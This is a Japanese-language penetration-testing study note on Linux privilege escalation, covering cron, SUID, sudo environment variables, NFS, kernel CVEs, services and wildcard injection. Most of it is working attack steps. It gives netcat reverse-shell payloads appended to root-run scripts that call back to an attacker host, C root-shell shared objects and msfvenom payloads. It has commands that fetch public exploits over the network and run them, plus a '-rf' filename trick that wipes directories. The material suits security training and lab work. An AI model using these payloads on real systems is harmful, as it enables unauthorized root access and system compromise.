- 関連ノート：
	- [🔍Linux Enumeration](🔍Linux%20Enumeration.md)
	- パーミッションについての基本事項：[権限関連の知識、コマンド](../Common/権限関連の知識、コマンド.md)

---

# Cronを利用したPrivEsc

高権限でファイルを定期的に実行しているcronを悪用する。

## Cron w/ Writable File

- 条件：
	- root権限で動作しているCron
	- 書き込み権限(`w`)のある実行可能ファイルを実行
	- 実行間隔がテストに使える時間の範囲内(実行間隔が短い)

1. [Cronの列挙コマンド](🔍Linux%20Enumeration.md#Cronの列挙コマンド)で、条件を満たすCronを検索

2. [名前付きパイプを使ったnetcatリバースシェル](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#名前付きパイプを使ったnetcatリバースシェル)のペイロードを実行可能ファイルに追記する
```zsh
# ファイルが存在することを確認＆空白行を入れてペイロード注入による影響を減少
echo >> <file.sh>
```
```zsh
echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
```
```zsh
chmod +x <file.sh>
```

3. 攻撃者のマシンでリバースシェルリスナーを用意し、ターゲット上でcronが実行されるのを待つ

---

## Cron w/ PATH変数

- 条件：
	- root権限で動作しているCron
	- 実行可能ファイルがフルパス指定ではなく、**相対パス(relative path)指定**
	- 実行間隔がテストに使える時間の範囲内(実行間隔が短い)

1. cronのPATH変数を確認する
```zsh
cat /etc/crontab
```
↓出力例

![](../../Images/Pasted%20image%2020230626210329.png)

2. [Cronの列挙コマンド](🔍Linux%20Enumeration.md#Cronの列挙コマンド)で実行ファイル(.sh)を実行するcronを探す

3. 実行ファイルがフルパスではないことを確認
	- 例：
		- ✅ pwd
		- ❌ /usr/sbin/pwd

4. 本来の実行ファイルフルパスよりも前のディレクトリが書き込み可能かどうかを確認
	- PATH変数の編集には一般的にroot権限が必要なので割愛
```zsh
ls -la <directory>
```

5. 書き込み可能かつPATH変数の値であるディレクトリに、ステップ２の実行ファイルと同じファイル名のペイロードを用意
```zsh
cd <directory>
echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <(同じ名前)file.sh>
```
```zsh
chmod +x <(同じ名前)file.sh>
```

6. リバースシェルリスナーを用意し、cronの実行を待つ

### 補足：systemdの場合

- LinPEASの結果の`Systemd Information`に以下のように表示されることがある

![](../../Images/Pasted%20image%2020260214172732.png)

- 使用しているサービス(systemd)によって実行されるコマンドが相対パスで指定されている場合は、[Cron w/ PATH変数](#Cron%20w/%20PATH変数)と同じ原理で攻撃できる
	- ※ただし、LinPEASは誤って引数もコマンドと解釈して検知することがある（上記画像で、`apache2.service: Uses relative path 'start'`と表示があるが、`start`は引数

---
---

# `/etc/passwd`認証を利用したPrivEsc

- 方法：`/etc/passwd`に直接パスワードハッシュを書き込む
	- `/etc/passwd`の第二フィールドに`x`ではなくパスワードハッシュがある場合、`/etc/shadow`よりも優先される仕様がある

- 条件：`/etc/passwd`が書き込み可能

1. パスワードハッシュを生成する
```zsh
openssl passwd <pw>
```

2. `/etc/passwd`に任意のユーザーと作成したパスワードハッシュの組み合わせを追記する
```zsh
echo '<username>:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
```

3. 作成したユーザーにsuする
```zsh
su <username>
```

> [!NOTE]
> `openssl` は通常デフォルトでLinuxがサポートするハッシュアルゴリズムでハッシュ化するが、システムによってはサポートされないアルゴリズムを使うことがある。その場合は[補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき](#補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき)を参照

## 補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき

1. ターゲットシステムがサポートしているハッシュアルゴリズムを確認
```zsh
cat /etc/login.defs | grep ENCRYPT_METHOD
```
	↓
```
# This variable is deprecated. You should use ENCRYPT_METHOD.
ENCRYPT_METHOD SHA512
```

2. opensslで利用可能なハッシュアルゴリズムを調査し、パスワードハッシュを生成
```zsh
openssl passwd --help
```
```zsh
openssl passwd -6 <pw>
```

3. 出力されたパスワードハッシュで`/etc/passwd`に書き込む

> [!NOTE]
> - 出力されたハッシュを**すべてコピー**すること
> - `$` が含まれる場合、ダブルクォーテーションで囲まないこと（シェル変数として展開され、ハッシュが壊れる）

---
---

# SUIDとCapabilityを利用したPrivEsc


> [!NOTE]
> SGIDの場合は、バイナリの所有グループに属するユーザーへのLateral Movementが可能

## SUIDバイナリ w/ 公開エクスプロイト

1. [高権限をもつバイナリの列挙](🔍Linux%20Enumeration.md#高権限をもつバイナリの列挙)を実施
2. 🔗[GTFOBins](https://gtfobins.github.io/)を使い、対象のバイナリを検索→"SUID"もしくは"Capability"に記載のコマンドを（説明を読んだ上で）実行
	- SGIDがあるバイナリに対しては、SUIDのテクニックを使える
	- [補足：GTFOBinsの方法でPermission%20deniedの場合の原因追求](#補足：GTFOBinsの方法でPermission%20deniedの場合の原因追求)

> [!TIP]
> バイナリのバージョンによっては、Exploit-DBに公開エクスプロイトが存在する場合がある

---

## SUIDバイナリ w/ PATH変数

- 方法：PATH環境変数を操作して、SUIDバイナリに攻撃者が作成した実行ファイルを実行させる
- PATH環境変数は実行可能なプログラムを格納するディレクトリを指定する環境変数で、コマンド実行時にこの変数を参照してファイルを検索する
- 条件：
	- SUIDバイナリがコマンドを実行しているが、コマンドが絶対パス指定ではない
		- (例：`/usr/bin/pwd`ではなく、`pwd`)
	- 書き込み可能なディレクトリがPATH内に存在する or PATH変数自体を変更可能

### 事前調査

脆弱性の有無を判断するため、以下4つを確認する。

1. PATH変数のディレクトリを確認
```zsh
echo $PATH
```

2. システム全体から書き込み可能なディレクトリを列挙し、現在のユーザーにPATH変数のディレクトリに対する書き込み権限があるかを確認
```zsh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

3. もしくはPATH変数を変更することは可能かを確認
```zsh
# バックアップ
echo $PATH >> PATH.bkup
# 変更試行
export PATH=$PATH:/test
echo $PATH
# 切り戻し
echo PATH.bkup
export PATH=<PATH.bkupの中身>
```

4. [高権限をもつバイナリの列挙](🔍Linux%20Enumeration.md#高権限をもつバイナリの列挙)で検出したSUIDバイナリが、フルパスを使わずにコマンドを呼び出している
	- 実際にバイナリを動作させてエラーメッセージからコマンドを推測するか、`strings`コマンドで文字列を抽出してコマンドを確認する

### パターンA：書き込み可能なディレクトリがPATH内に存在する場合

1. 書き込み可能なPATHディレクトリに、SUIDバイナリが呼び出しているコマンドと同じ名前の偽のコマンドを作成する
```zsh
cd <書き込み可能なPATHディレクトリ>
echo "/bin/bash" > <コマンド名>
chmod +x <コマンド名>
```

2. SUIDバイナリを実行する
```zsh
./<SUIDバイナリ>
```
- →owner権限で/bin/bashが実行される

### パターンB：PATH変数が変更可能な場合

1. 元のPATH変数をバックアップ
```zsh
echo $PATH
```

2. PATH変数を変更（通常は全ユーザーに書き込み権限がある`/tmp`を先頭に追加）
```zsh
export PATH=/tmp:$PATH
```

3. /tmpに偽のコマンドを作成
```zsh
cd /tmp
echo "/bin/bash" > <コマンド名>
chmod +x <コマンド名>
```

4. SUIDバイナリを実行
```zsh
./<SUID_binary>
```
- →owner権限で/bin/bashが実行される
- PATH変数を元に戻すこと

---

## SUID w/ Shared Object(.so) Injection

- 方法：悪意ある共有オブジェクトを注入して任意の処理を実行させる
- 条件：
	- rootのSUIDがセットされた実行ファイルが、存在しない共有オブジェクト(.so)を参照している
	- 「存在しない共有オブジェクト」が書き込み可能なディレクトリ

1. SUIDバイナリの動作をトレースし、存在しない共有オブジェクトを参照していないかどうかを確認する
```zsh
strace <SUID_binary> 2>&1 | grep -iE "open|access|no such file"
```
- 共有オブジェクト(拡張子が`.so`)、かつNo such file or directoryならOK

![](../../Images/Pasted%20image%2020230627095059.png)

$$参照する共有オブジェクトが存在しないエラーが表示(libcalc.so)$$

2. 「存在しない共有オブジェクト」のディレクトリを用意する
	- （用意できない場合は他の共有オブジェクトをあたる）
```zsh
# 上記の場合：mkdir /home/user/.config
mkdir <directory>
```

3. ペイロードを用意（ファイル名は任意だが`shell.c`とする）
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

4. SUIDバイナリが参照している 「存在しない共有オブジェクト」と同じファイルパスでコンパイルする
```zsh
gcc -fPIC -shared -o <共有オブジェクトファイルフルパス> shell.c
```

5. SUIDバイナリを実行すると、権限昇格

---

## SUID w/ Bash <= 4.2.-048

Shellshockと呼ばれる。

- 条件：
	- Bashのバージョンが4.2-048以下のとき
	- rootのSUIDバイナリがコマンドを実行している

1. Bashのバージョンが4.2-048以下であることを確認
```zsh
/bin/bash --version
```

2. 対象のSUIDバイナリの中身を閲覧し、実行コマンドのパスを確認
```zsh
strings <SUIDバイナリのパス>
```
↓出力例
```
/usr/sbin/service apache2 start...
```

3. 実行コマンドのフルパスと同名のBash関数を作成する
```zsh
# 上記の出力の場合：function /usr/sbin/service { /bin...}
function <実行コマンドフルパス> { /bin/bash -p; }
export -f <実行コマンドフルパス>
```

4. SUIDバイナリを実行する

---

## SUID w/ Bash <= 4.3

🔗[CVE-2016-7543](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006966.html)

4.3以下であっても、パッチの適用状況やディストロによってはこのエクスプロイトが成功せず、反対に[SUID w/ Bash <= 4.2.-048](#SUID%20w/%20Bash%20<=%204.2.-048)の方法は成功する可能性もある。

- 条件：
	- Bashのバージョンが4.3以下のとき
	- rootのSUIDバイナリがコマンドを実行している

1. Bashのバージョンが4.3以下であることを確認
```zsh
/bin/bash --version
```

2. bashデバッグを有効にし、PS4変数に対し SUIDがセットされた`/bin/bash`を作成する組み込みコマンド(`/tmp/rootbash`)を設定する
```zsh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <SUID_binary>
```

3. 作成したコマンドを実行し、高権限シェルを獲得
```zsh
/tmp/rootbash
```

---
---

# Sudoを利用したPrivEsc

## Sudo権限 w/GTFOBins

1. [ユーザー情報・ホスト名の列挙コマンド](🔍Linux%20Enumeration.md#ユーザー情報・ホスト名の列挙コマンド)でsudo権限を確認
```zsh
sudo -l
```

2. 🔗[GTFOBins](https://gtfobins.github.io/)を使い、対象のバイナリを検索 → `Sudo`に記載のコマンドを（説明を読んだ上で）実行

### 補足：GTFOBinsの方法でPermission deniedの場合の原因追求

以下が原因の場合、対策として他のバイナリを使うか、他の攻撃ベクターを使う。

- 一部のオプションのみがsudoで実行可能で、GTFOBinsに記載のオプションは使えないから
	- 例えば、`sudo -l`の結果が以下の場合、`crontab -l`のみしか使えない
```
...(ALL) (ALL) /usr/bin/crontab -l
```

- AppArmorやClamAVなどのセキュリティ機構がGTFOBinsのコマンドを遮断しているから
	- AppArmorはDebian 10以降はデフォルトで有効になっている
	- syslogからauditデーモンのログを閲覧し、apparmorが動作していることを確認
```zsh
cat /var/log/syslog | grep <binary(tcpdump等)>
```
	↓
```zsh
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump"
```

---

## Sudo権限  w/環境変数

### Sudo権限と環境変数によるPrivEscの条件

1. `sudo -l`の結果表示されたコマンドがGTFOBinsに載っていないとき

2. コマンドが共有オブジェクトを動的リンクするとき
```zsh
file <path_to_binary>
```
-  例: `ELF 64-bit LSB shared object, x86-64, ...` → ✅動的リンク（shared object）の可能性が高い
- 例: `statically linked` または `statically linked, stripped` → ❌静的リンク（LD_PRELOAD は効かない）

3. `sudo -l`の結果出力結果に`env_reset`があり、さらに`env_keep`に以下のいずれかがある

| 環境変数            | 環境変数の目的               | 任意コード実行の仕組み                                                                                                   |
| --------------- | --------------------- | ------------------------------------------------------------------------------------------------------------- |
| LD_PRELOAD      | このライブラリを必ず最初に読み込む、と指定 | コマンド実行時、リンカが`LD_PRELOAD` に設定された共有オブジェクトを優先的に読み込むため（フック≒横取り）、攻撃者の用意した悪意ある共有オブジェクトを先に読み込ませて任意コードを実行             |
| LD_LIBRARY_PATH | どの場所を先に探すか、と検索順を操作    | コマンド実行時、リンカが`LD_LIBRARY_PATH`に指定された共有オブジェクトを順に読み込むため、ターゲットが依存する共有ライブラリ名（SONAME）と同じ名前の .so を先に読み込ませれば任意コードを呼べる |

![](../../Images/Pasted%20image%2020230626181707.png)


### LD_PRELOADの場合

エクスプロイト技法ソース🔗：[LD_PRELOAD and NOPASSWD - PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)

1. ペイロードを用意（ファイル名は任意だが`shell.c`とする）
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
}
```

2. コンパイル
```zsh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. `sudo -l`の結果出力されたバイナリを`<program_name>`に代入して実行
```zsh
# 例：sudo LD_PRELOAD=/tmp/shell.so find
sudo LD_PRELOAD=/tmp/shell.so <program_name>
```

### LD_LIBRARY_PATHの場合

偽の共有オブジェクトを作成するので、本来の共有オブジェクトをリンクするバイナリにも影響が出る可能性がある → LD_PRELOADがベター

1. `sudo -l`の結果出力されたバイナリの共有ライブラリを確認する
```zsh
ldd <full_path_binary(例:/usr/sbin/apache2)>
```
	↓出力例
```
libuuid.so.1 ⇨ /lib/libuuid.so.1(0x0007f609dc24000)
librt.so.1 ⇨ /lib/librt.so.1(0x...)
libcrypt.so.1 ⇨ /lib/libcrypt.so.1(0x...)
```

2. ステップ１の結果リストされたライブラリの１つと同じ名前の悪意ある共有オブジェクト(so)を作成する
```c
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```zsh
gcc -o /tmp/<xxxx.so.1(例:libcrypt.so.1)> -shared -fPIC <上記Cコードへのパス>
```

3. LD_LIBRARY_PATHに対し、ステップ２で`/tmp`に置いた共有ライブラリを探せと指示した上で、バイナリを実行
```zsh
sudo LD_LIBRARY_PATH=/tmp <binary(例:apache2)>
```

---
---

# NFSを利用したPrivEsc

- 方法：攻撃者マシン上にてroot権限で作成した悪意あるSUIDバイナリを ターゲットマシンの共有フォルダに配置し、ターゲットの低権限ユーザーで実行する
- 条件：
	- NFSが設定されている
	- NFSの中に書込み可能なディレクトリがあり、かつ`no_root_squash`が設定されている

1. ターゲットマシン上でNFSの設定を確認する
```zsh
cat /etc/exports
```
- `no_root_squash`が設定されているディレクトリを確認

2. `no_root_squash`が設定されているディレクトリが一般ユーザーにも書込み可能かどうかを確認
```zsh
ls -la <directory_full_path>
```

3. 攻撃者マシン上でマウントポイントを作成し、ターゲットの書き込み可能な共有フォルダをマウントする
```zsh
sudo su
mkdir /tmp/nfs
mount -o rw,vers=3 <target_IP>:<writable_directory_full_path> /tmp/nfs
```

3. ペイロードを生成し、マウントフォルダに保存する
```zsh
msfvenom -p linux/<architecture>/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

4. ペイロードにSUIDと実行権限付与
```zsh
chmod +xs /tmp/nfs/shell.elf
```

5. ターゲットマシン上で生成したペイロードを実行し、権限昇格
```zsh
<writable_directory_full_path>/shell.elf
```

---
---

# カーネルの脆弱性を利用したPrivEsc

[基本的なシステム情報の列挙](🔍Linux%20Enumeration.md#基本的なシステム情報の列挙)

## 脆弱性を利用するにあたって...

- 公開エクスプロイトを使用するには、カーネルバージョンとOSのディストリビューションが一致している必要がある
- 互換性を保つため、ターゲットマシン上でコンパイルすることがベスト
	- gccなどのコンパイラがない場合、攻撃者のマシンやターゲット環境を模した環境でコンパイルして転送する

> [!NOTE]
> カーネルエクスプロイトの列挙にSearchsploitを使うと非効率なことが多いため、LinPEAS.shを使用する。LinPEASの結果の `Executing Linux Exploit Suggester` セクションを確認すること。

- SearchSploitでの公開エクスプロイト検索手法
```zsh
# 具体例：searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
searchsploit "linux kernel <ディストリビューション> <ディストリビューションのメジャーバージョン> Local Privilege Escalation"
```
- `grep`や`grep -v`(除外)を使い対象のバージョンに合うものを絞り込む

---

## 確認必須事項：パッチのバックポート有無

> [!WARNING]
> カーネルバージョンとディストロが一致していて公開エクスプロイトが利用可能に見えても、バックポート（より新しいバージョン用のパッチを古いバージョンに適用すること）によって対象CVEへのパッチが当たっていることがある。必ず公式サイトで確認してから使うこと。

💡以下に説明する手順のショートカットで完結させる検索ワード
```zsh
# site:ubuntu.com "USN" CVE-2016-5195
site:<ディストロのドメイン名> "<セキュリティリリース情報名(※)>"
```
- （※）`[ディストロ名] Security Notice`と検索すればわかる

1. ディストロごとの公式 CVE / セキュリティ情報ページを特定
	- Ubuntu🔗: [Ubuntu CVE Tracker](https://ubuntu.com/security/cve), [USN](https://ubuntu.com/security/notices)
	- Debian🔗: [Debian Security Tracker](https://security-tracker.debian.org/tracker/)
	- Red Hat / CentOS / Fedora🔗: [Red Hat CVE Database](https://access.redhat.com/security/security-updates/cve)
	- SUSE / openSUSE🔗: [SUSE Security Announcements](https://www.suse.com/support/security/)
	- Arch Linux🔗: [Arch Security Advisories](https://security.archlinux.org/)
2. 該当CVEを検索
3. 表示されたページで修正済みバージョンや関連セキュリティアドバイザリを確認
- 各ディストロは *Security Notice / Advisory* と呼ばれる修正通知を発行している
- 通知ページには「修正が含まれるパッケージ（カーネル）」のバージョンが記載されている
	→ そこに載っているバージョン **以上** であれば修正済みと判断する

![](../../Images/Pasted%20image%2020250909131226.png)

$$USNの修正済みバージョン情報$$

---

## 主なカーネルエクスプロイト

### カーネルエクスプロイト一覧表

| エクスプロイト                                                                      | 対象ディストロ                                                                        | 対象カーネル                                    | 備考 / コメント                                                                                    |
| ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------- | -------------------------------------------------------------------------------------------- |
| [Dirty Cow (CVE-2016-5195)](#Dirty%20Cow%20(CVE-2016-5195))                  | ほぼ全Linux                                                                       | 2.x ～ 4.8.2                               | カーネル依存型。ディストロごとのバックポートは要確認。g++の有無でコンパイル方法が変わる。                                               |
| [PwnKit (CVE-2021-4034)](#PwnKit%20(CVE-2021-4034))                          | ・Ubuntu 10–21.10  <br>・Debian 7–11  <br>・RedHat 6.0–8.4（Fedora / CentOSも可能性あり） | すべてのカーネル                                  | pkexec / polkit < 0.120 に依存。ディストロごとのパッケージバージョンで判定。**使いやすい**                                  |
| [Get-Rekt BPF (CVE-2017-16995)](#Get-Rekt%20BPF%20(CVE-2017-16995))          | ・Debian 9  <br>・Ubuntu 14.04–16.04  <br>・Mint 17–18  <br>・Fedora 25–27         | 4.4.0 – 4.14.10                           | カーネル依存型。                                                                                     |
| [Dirty Pipe (CVE-2022-0847)](#Dirty%20Pipe%20(CVE-2022-0847))                | ・Ubuntu 20.04–21.04  <br>・Debian 11  <br>・RHEL 8.0–8.4  <br>・Fedora 35         | 5.8.x以上 (修正済: 5.16.11, 5.15.25, 5.10.102) | カーネル依存型。ターゲットカーネルが修正済みか確認。                                                                   |
| 🔗[Polkit (CVE-2021-2560)](https://www.exploit-db.com/exploits/50011)        | ・Ubuntu 20.04 / 20.10  <br>・Debian 11  <br>・RHEL 8.x / Fedora 33               | すべてのカーネル                                  | 2021年頃の比較的新しい環境が対象。  <br>D-Busの応答を切断するタイミングを利用した論理バグ。  <br>GUI環境がなくても成立する。                   |
| [sudo Baron Samedit (CVE-2021-3156)](#sudo%20Baron%20Samedit(CVE-2021-3156)) | ほぼ全ディストロ（sudo 使用環境）                                                            | すべてのカーネル                                  | カーネル非依存（sudo のバージョン依存）。  <br>*sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1* が対象。  <br>ヒープオーバーフロー。 |


---

### Dirty Cow (CVE-2016-5195)

#### ターゲットでg++が使える場合

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送
```zsh
searchsploit -m 40847
python -m http.server 8080
```

2. ターゲットマシンにコピーし、コンパイルし、exploit実行
```zsh
wget http://<attacker_IP>:8080/40847.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```

#### ターゲットでg++が使えない場合：

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送
```zsh
searchsploit -m 40839
python -m http.server 8080
```

2. ターゲットマシンにコピーし、コンパイルし、exploit実行を
```zsh
wget http://<attacker_IP>:8080/40839.c -O dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty [任意のパスワード]
```

3. 最後に/etc/passwdの復元をすること
```zsh
mv /tmp/passwd.bak /etc/passwd
```

---

### PwnKit (CVE-2021-4034)

1. pkexec の存在と SUID ビット確認
```zsh
ls -l /usr/bin/pkexec
```
→実行結果のパーミッションに `-rwsr-xr-x` のように s (SUID) が含まれていれば対象となる可能性がある

2. インストールされている polkit バージョン確認
```zsh
dpkg -s policykit-1 | grep Version
```
→出力を[💥Linux Privilege Escalation](#ディストロごとの%20vulnerable%20/%20fixed%20バージョン)と照合する。

3. 脆弱なバージョンであれば、エクスプロイトの実行
```zsh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
chmod +x pwnkit
./pwnkit         # 対話型シェルを取得
./pwnkit 'id'    # 単発コマンド実行
```
実行後、もしシステムがすでに修正済みであれば「失敗しました」と明示的に通知される

#### ディストロごとの vulnerable / fixed バージョン

- 🔗参照：[The PwnKit vulnerability: Overview, detection, and remediation](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)

| Ubuntu version | Latest vulnerable version | First fixed version         |
| -------------- | ------------------------- | --------------------------- |
| 14.04 LTS      | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
| 16.04 LTS      | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
| 18.04 LTS      | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
| 20.04 LTS      | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |

| Debian version | Latest vulnerable version | First fixed version |
| -------------- | ------------------------- | ------------------- |
| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
| unstable       | 0.105-31.1~deb12u1        | 0.105-31.1          |

---

### Get-Rekt BPF (CVE-2017-16995)

1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送
```zsh
searchsploit -m 45010
python -m http.server 8080
```

2. ターゲット上にダウンロードし、コンパイルして実行
```zsh
wget http://<attacker_IP>:8080/45010.c -O cve-2017-16995
gcc cve-2017-16995.c -o cve-2017-16995
```

---

### Dirty Pipe (CVE-2022-0847)
   
1. 攻撃者マシン上で公開エクスプロイトをコピーし、ターゲットに転送
```zsh
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
python -m http.server 8080
```

2. ターゲットマシン上にダウンロードし、コンパイルして実行
```zsh
wget http://<attacker_IP>:8080/exploit.c
# コンパイルが失敗する場合は、攻撃者マシン上でgcc -staticでコンパイル
# 攻撃者マシン上でstaticでコンパイルした場合は実行時にエラーが表示されるが多分問題なし
gcc exploit.c -o exploit
./exploit
```

3. エクスプロイトが成功しているかどうかを確認し、rootに権限昇格
	"su: must be run from a terminal"や"system() function call seems to have failed :("が表示されても成功している可能性が高い
```zsh
grep root /etc/passwd
```
	↓出力例
```zsh
root:$1$aaron$abcdefghijk...:0:0:root:/root:/bin/bash
```
	↓
```zsh
# パスワード: aaron
su -
```

4. root権限になった状態で、rootのパスワードを復元する
```zsh
mv /tmp/passwd.bak /etc/passwd
```

---

### Polkit

1. Polkitの有無を確認
```zsh
systemctl status polkit
```

2. 脆弱なバージョンかどうかを判定
```zsh
# Debian/Ubuntu系
dpkg -s policykit-1 | grep Version
# RHEL/CentOS系
rpm -qa polkit
```
- 主な対象バージョン目安:
	- Ubuntu 20.04 (polkit < 0.105-26ubuntu0.3)
	- RHEL 8.x (polkit < 0.115-11.el8_4.1)

3. エクスプロイトのダウンロード
```zsh
searchsploit -m 50011
```

4. 実行
```zsh
./50011.sh
```
- 失敗すると、`[*] Attempting to create account`でハングする

---

### sudo Baron Samedit (CVE-2021-3156)

https://github.com/worawit/CVE-2021-3156

1. sudo のバージョン確認
```sh
sudo --version
```
- → 出力の先頭行のバージョンを確認し、脆弱なバージョンか判定    
	- 1.8.2 ～ 1.8.31p2、1.9.0 ～ 1.9.5p1

2. ディストロによってはバックポート修正されているため、パッケージのリビジョンも確認する
```sh
# Debian / Ubuntu の場合
dpkg -l sudo
# RHEL / CentOS / Fedora の場合
rpm -qa | grep sudo
```
- → 出力を[💥Linux Privilege Escalation](#ディストロごとのvulnerable%20/%20fixed%20バージョン)と照合

3. exploit の実行
```sh
curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py -o exploit_nss.py

python3 exploit_nss.py
```

#### ディストロごとのvulnerable / fixed バージョン

🔗参照：  
https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt

| Ubuntu version | Vulnerable          | Fixed               |
| -------------- | ------------------- | ------------------- |
| 16.04 LTS      | 1.8.16 ～ 1.8.31p2   | 1.8.16-0ubuntu1.10  |
| 18.04 LTS      | 1.8.21p2 ～ 1.8.31p2 | 1.8.21p2-3ubuntu1.4 |
| 20.04 LTS      | 1.8.31              | 1.8.31-1ubuntu1.2   |

| Debian version | Vulnerable | Fixed               |
| -------------- | ---------- | ------------------- |
| Stretch        | vulnerable | 1.8.19p1-2.1+deb9u3 |
| Buster         | vulnerable | 1.8.27-1+deb10u3    |
| Bullseye       | vulnerable | 1.9.5p2-3           |

| RHEL / CentOS Version | Fixed                    |
| --------------------- | ------------------------ |
| 6                     | sudo-1.8.6p7-29.el6_10.3 |
| 7                     | sudo-1.8.23-10.el7_9.1   |
| 8                     | sudo-1.8.29-6.el8_3.1    |

---
---

# Serviceを利用したPrivEsc

1. サービスの定義ファイルを閲覧し、実行ファイルがあるかどうかを確認
```zsh
systemctl cat <service>
```
	↓出力例
```zsh
<Service>
ExecStart=/usr/local/bin/<xxx.sh>
```

2. 実行ファイルのパーミッションを確認
```zsh
ls -la <path_to_binary>
```
	↓
```zsh
-rwxrwxrwx 1 root root 1234 Aug 30 10:00 /usr/local/bin/<xxx.sh>
```
- →誰でも書き換え可能

3. [名前付きパイプを使ったnetcatリバースシェル](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#名前付きパイプを使ったnetcatリバースシェル)のペイロードを実行可能ファイルに追記する
```zsh
# ファイルが存在することを確認＆空白行を入れてペイロード注入による影響を減少
echo >> <file.sh>
```
```zsh
echo "mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f" >> <file.sh>
```
```zsh
chmod +x <file.sh>
```

4. サービスrestart

---
---

# Unix Wildcards Gone Wild

## Unix Wildcardの基礎

|Wildcard|説明|例|
|---|---|---|
|`*`|0個以上の任意の文字列にマッチ|`*.php` → すべてのPHPファイル|
|`?`|任意の1文字にマッチ|`test?` → test1, testa など|
|`[ ]`|ブラケット内の任意の1文字にマッチ|`[abc]*.txt` → a,b,cで始まるtxtファイル|
|`-`|`[ ]`内で文字範囲を指定|`[a-z]*` → 小文字で始まるファイル|
|`~`|ホームディレクトリに展開（単語の先頭）  <br>`~username`でユーザーのホーム|`~/.bashrc` → 自分のホームディレクトリの.bashrcファイル|

---

## Wildcard Attack の仕組み

### 攻撃原理

- Shellはワイルドカードを展開する際、ハイフン(`-`)で始まるファイル名をコマンドラインオプションとして解釈する（`-rf`というファイル名等）
- これにより、攻撃者が作成した「オプション名のようなファイル名」が、実行コマンドの引数として注入される（Argument Injection）
- rootが実行するコマンドが==書き込み可能な==ディレクトリをワイルドカード指定しているときに可能
- 参考記事🔗：[Back To The Future: Unix Wildcards Gone Wild - Exploit-DB](https://www.exploit-db.com/papers/33930)

### 基本例：`rm *` による再帰削除

```zsh
# 攻撃前のディレクトリ状態
$ ls -al
drwxrwxr-x. DIR1
drwxrwxr-x. DIR2
-rw-rw-r--. file1.txt
-rw-rw-r--. file2.txt
-rw-rw-r--. -rf          # 攻撃者が作成したファイル

# rootが削除コマンド実行
$ rm *
```
- 結果：すべてのファイル・ディレクトリが再帰削除される
- 理由：`rm DIR1 DIR2 file1.txt file2.txt -rf` と展開され、`-rf`オプションが適用される

---

## 実践的な攻撃手法

### Chown File Reference Trick（ファイル所有者ハイジャック）

#### 仕組み

`chown`の`--reference`オプションを悪用し、指定ファイルの所有者情報を参照させる
```
--reference=RFILE
    指定したRFILEの所有者・グループを使用（OWNER:GROUP値の代わり）
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリに ダミー参照ファイル（DRF: Dummy Reference File）を作成
```bash
# 攻撃者が自分の所有するファイルを作成
touch .drf.php
chmod 644 .drf.php
```

2. `--reference`オプションファイルを作成
```bash
touch -- '--reference=.drf.php'
# または
touch ./'--reference=.drf.php'
```

3. rootが所有者変更を実行すると...
```bash
# rootの意図：すべてのPHPファイルをnobody:nobodyに変更
chown -R nobody:nobody *.php

# 実際の展開：
# chown -R nobody:nobody admin.php config.php ... --reference=.drf.php
```
- → .drf.phpの所有者（攻撃者）がすべてのファイルの所有者になる

